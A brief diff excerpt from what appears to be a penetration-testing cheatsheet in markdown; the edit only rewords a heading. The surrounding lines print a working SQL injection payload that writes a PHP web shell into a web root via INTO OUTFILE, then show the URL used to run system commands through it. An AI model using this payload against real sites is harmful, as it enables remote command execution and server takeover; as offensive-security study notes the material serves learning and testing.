@@ -433,7 +433,7 @@ My simple cheatsheet:
 # Create File
 ?id=1 union all select 1,2,"<?php echo '<pre>' . shell_exec($_GET['cmd']). '<pre>';?>" into OUTFILE 'c:\htdocs\evil.php'
 
-## Navigate to Created File
+## Navigate to the Created File
 /evil.php?cmd=dir
 ```
 
